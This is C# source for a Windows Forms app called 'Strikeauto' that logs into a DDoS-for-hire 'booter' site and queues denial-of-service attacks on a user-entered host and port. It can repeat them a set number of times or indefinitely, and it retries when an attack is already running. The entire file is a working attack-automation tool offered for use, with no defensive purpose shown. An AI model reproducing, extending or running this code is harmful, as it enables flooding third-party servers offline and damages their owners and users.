using RestSharp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Strikeauto
{
    public partial class Main : Form
    {
        private RestClient Client = new RestClient("http://strikeout.xyz");
        private CancellationToken Token = new CancellationTokenSource().Token;
        private CookieContainer Cookies = new CookieContainer();
        private const string ChromeAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
        private int RepeatCount = 1;
        private bool BooterRunning = false;

        public Main()
        {
            InitializeComponent();
            MethodTxt.SelectedIndex = 0;
            ToggleBooterMenu();
            Client.CookieContainer = Cookies;
        }

        public async void Login(string name, string pass, string _2fa = null)
        {
            StatusLbl.ForeColor = SystemColors.MenuHighlight;
            StatusLbl.Text = "Logging in..";
            RestRequest login = new RestRequest("/ajax/login.php");
            login.AddParameter("username", name);
            login.AddParameter("password", pass);
            login.AddParameter("2fa", _2fa);

            var cont = await Client.ExecutePostTaskAsync(login, Token);

            string content = cont.Content;

            if (content.Contains("You have logged in sucessfully"))
            {
                StatusLbl.ForeColor = Color.Green;
                StatusLbl.Text = "Logged in!";
                PasswordTxt.Enabled = false;
                UsernameTxt.Enabled = false;
                SecTxt.Enabled = false;
                LoginBtn.Enabled = false;
                ToggleBooterMenu();
            }

            else
            {
                StatusLbl.ForeColor = Color.Red;
                StatusLbl.Text = "Login failed!";
            }
        }

        public async void Boot(string host, ushort port, int time, string type)
        {
            RestRequest boot = new RestRequest("/ajax/queue.php");
            boot.AddParameter("launch", 1);
            boot.AddParameter("host", host);
            boot.AddParameter("port", port);
            boot.AddParameter("time", time);
            boot.AddParameter("type", type);
            boot.AddParameter("skype", 0);
            boot.AddParameter("ipcheck", 1);

            var cont = await Client.ExecutePostTaskAsync(boot, Token);

            string content = cont.Content;
            if (content.Contains("Your attack has been placed in queue")) return;
            else if (content.Contains("You are already running an attack"))
            {
                await Task.Delay(10000);
                Boot(host, port, time, type);
            }
            else MessageBox.Show($"Oh no! There's an unknown error..\n\n\n {content}");
        }

        private void ValidateLogin(object sender, EventArgs e) => LoginBtn.Enabled = UsernameTxt.TextLength > 0 && PasswordTxt.TextLength > 0;
        private void HostTxt_TextChanged(object sender, EventArgs e) => StartBtn.Enabled = HostTxt.TextLength > 0;

        private void LoginBtn_Click(object sender, EventArgs e)
        {
            Login(UsernameTxt.Text, PasswordTxt.Text, SecTxt.Text);
        }

        private void RepeatTxt_ValueChanged(object sender, EventArgs e)
        {
            RepeatCount = (int)RepeatTxt.Value;
            StartBtn.Text = RepeatCount == 0 ? "Start (∞)" : $"Start ({RepeatCount})";
            NotificationLbl.Visible = RepeatCount == 0;
        }

        private void ToggleBooterMenu()
        {
            PortTxt.Enabled = !PortTxt.Enabled;
            TimeTxt.Enabled = !TimeTxt.Enabled;
            HostTxt.Enabled = !HostTxt.Enabled;
            RepeatTxt.Enabled = !RepeatTxt.Enabled;
            StartBtn.Enabled = HostTxt.TextLength > 0 && !BooterRunning;
            MethodTxt.Enabled = !MethodTxt.Enabled;
        }

        private async void StartBtn_Click(object sender, EventArgs e)
        {
            BooterRunning = true;
            ToggleBooterMenu();

            if (RepeatTxt.Value == 0)
                for (;;)
                {
                    BootStatusTxt.Text = "Running: ∞ boots remaining";
                    Boot(HostTxt.Text, (ushort)PortTxt.Value, (int)TimeTxt.Value, MethodTxt.Text);
                    await Task.Delay((int)TimeTxt.Value * 1000);
                }
            else
                for (int i = 0; i < RepeatTxt.Value; i++)
                {
                    BootStatusTxt.Text = $"Running.. \n{RepeatTxt.Value - i} boots remaining";
                    Boot(HostTxt.Text, (ushort)PortTxt.Value, (int)TimeTxt.Value, MethodTxt.Text);
                    await Task.Delay((int)TimeTxt.Value * 1000);
                }
        }
    }
}
